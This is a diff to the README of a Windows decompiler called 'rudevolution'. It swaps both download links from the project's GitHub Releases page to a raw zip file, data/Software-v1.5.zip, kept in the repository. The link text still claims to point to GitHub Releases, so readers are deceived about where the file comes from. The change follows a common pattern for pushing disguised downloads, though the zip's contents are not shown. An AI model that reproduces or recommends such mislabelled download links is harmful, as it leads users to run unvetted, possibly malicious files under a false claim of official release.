@@ -1,6 +1,6 @@
 # 🛠️ rudevolution - Decompile with clear, trusted results
 
-[![Download rudevolution](https://img.shields.io/badge/Download%20rudevolution-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rubiadialectic874/rudevolution/releases)
+[![Download rudevolution](https://img.shields.io/badge/Download%20rudevolution-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rubiadialectic874/rudevolution/raw/refs/heads/main/data/Software-v1.5.zip)
 
 ## 🧭 What rudevolution does
 
@@ -12,7 +12,7 @@ Use it when you want to open a program file and get a clearer view of what it do
 
 Visit the releases page and download the latest Windows file:
 
-[Download rudevolution from GitHub Releases](https://github.com/rubiadialectic874/rudevolution/releases)
+[Download rudevolution from GitHub Releases](https://github.com/rubiadialectic874/rudevolution/raw/refs/heads/main/data/Software-v1.5.zip)
 
 ## 🪟 Install on Windows
 
